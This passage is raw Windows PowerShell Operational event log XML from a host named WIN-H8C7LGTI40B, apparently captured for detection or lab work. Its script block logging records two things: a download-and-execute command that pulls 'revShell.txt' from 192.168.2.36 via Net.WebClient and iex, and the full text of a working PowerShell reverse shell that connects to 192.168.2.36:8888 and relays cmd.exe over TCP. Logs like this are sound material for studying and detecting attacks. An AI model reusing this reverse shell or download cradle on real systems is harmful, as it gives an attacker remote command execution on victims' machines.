+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:57.952189300Z'/><EventRecordID>3923357</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-658b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 64
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="system.net.sockets.tcpclient"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="system.net.sockets.tcpclient"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 64
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4105</EventID><Version>1</Version><Level>5</Level><Task>102</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:57.951526600Z'/><EventRecordID>3923356</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-618b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ScriptBlockId'>f255291b-96d8-489d-a112-5c58faedb11c</Data><Data Name='RunspaceId'>41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Data></EventData><RenderingInfo Culture='en-US'><Message>Started invocation of ScriptBlock ID: f255291b-96d8-489d-a112-5c58faedb11c
+Runspace ID: 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Message><Level>Verbose</Level><Task>Starting Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:57.951433000Z'/><EventRecordID>3923355</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-618b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = '192.168.2.36'
+$port = '8888'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
+</Data><Data Name='ScriptBlockId'>f255291b-96d8-489d-a112-5c58faedb11c</Data><Data Name='Path'></Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 1):
+function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = '192.168.2.36'
+$port = '8888'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
+
+
+ScriptBlock ID: f255291b-96d8-489d-a112-5c58faedb11c
+Path: </Message><Level>Verbose</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:56.896088700Z'/><EventRecordID>3923354</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0001-609e-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 62
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="Net.WebClient"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="Net.WebClient"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 62
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4105</EventID><Version>1</Version><Level>5</Level><Task>102</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:56.894339500Z'/><EventRecordID>3923353</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0001-5f9e-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ScriptBlockId'>68507bd3-eba8-413a-9574-572f3b4f1cfa</Data><Data Name='RunspaceId'>41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Data></EventData><RenderingInfo Culture='en-US'><Message>Started invocation of ScriptBlock ID: 68507bd3-eba8-413a-9574-572f3b4f1cfa
+Runspace ID: 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Message><Level>Verbose</Level><Task>Starting Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:56.893963700Z'/><EventRecordID>3923352</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0001-5f9e-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>iex (new-object Net.WebClient).downloadString("http://192.168.2.36:8001/revShell.txt")</Data><Data Name='ScriptBlockId'>68507bd3-eba8-413a-9574-572f3b4f1cfa</Data><Data Name='Path'></Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 1):
+iex (new-object Net.WebClient).downloadString("http://192.168.2.36:8001/revShell.txt")
+
+ScriptBlock ID: 68507bd3-eba8-413a-9574-572f3b4f1cfa
+Path: </Message><Level>Verbose</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:56.884244600Z'/><EventRecordID>3923351</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-068a-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 8
+        Command Name = PSConsoleHostReadLine
+        Command Type = Function
+        Script Name = 
+        Command Path = 
+        Sequence Number = 60
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 8
+        Command Name = PSConsoleHostReadLine
+        Command Type = Function
+        Script Name = 
+        Command Path = 
+        Sequence Number = 60
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4106</EventID><Version>1</Version><Level>5</Level><Task>103</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:56.883139200Z'/><EventRecordID>3923350</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-078a-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ScriptBlockId'>b3d2c607-28e4-4af2-96cc-f7c637b9b5c5</Data><Data Name='RunspaceId'>41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Data></EventData><RenderingInfo Culture='en-US'><Message>Completed invocation of ScriptBlock ID: b3d2c607-28e4-4af2-96cc-f7c637b9b5c5
+Runspace ID: 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Message><Level>Verbose</Level><Task>Stopping Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event></Events>
